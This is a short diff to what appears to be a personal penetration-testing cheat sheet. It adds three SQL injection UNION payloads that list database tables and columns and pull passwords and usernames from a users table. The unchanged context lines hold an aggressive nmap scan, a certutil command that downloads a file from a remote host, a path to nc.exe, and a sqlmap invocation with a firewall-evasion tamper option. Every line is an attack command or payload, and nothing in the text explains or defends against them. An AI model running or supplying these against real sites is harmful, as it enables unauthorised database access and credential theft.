@@ -25,3 +25,6 @@ nmap -iL file.txt -T5
 certutil -URLCache -f ip/file.txt destino
 /usr/share/windows-binaries/nc.exe
 sqlmap -u "http://www.site.com/?id=" --risk=1 --level=1 --random-agent --ignore-proxy --threads=5 --tamper=modsecurityversioned --dbs
+1' UNION SELECT 1,table_name FROM information_schema.tables-- -
+1' UNION SELECT table_name, column_name FROM information_schema.columns-- -
+1' UNION SELECT password, user FROM users-- -
